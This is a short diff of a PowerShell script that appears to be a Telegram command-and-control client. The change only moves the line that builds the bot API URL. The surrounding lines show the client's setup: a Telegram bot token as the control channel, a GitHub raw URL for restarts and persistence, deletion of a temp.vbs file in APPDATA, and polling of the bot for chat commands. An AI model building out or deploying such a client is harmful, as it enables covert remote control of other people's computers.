@@ -20,7 +20,6 @@ $Token = "$tg"  # REPLACE $tg WITH YOUR TELEGRAM BOT API TOKEN! (unless using a 
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
-$URL='https://api.telegram.org/bot{0}' -f $Token
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
@@ -41,6 +40,7 @@ if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\M
 # Startup Delay
 Sleep 10
 # Get Chat ID from the bot
+$URL='https://api.telegram.org/bot{0}' -f $Token
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
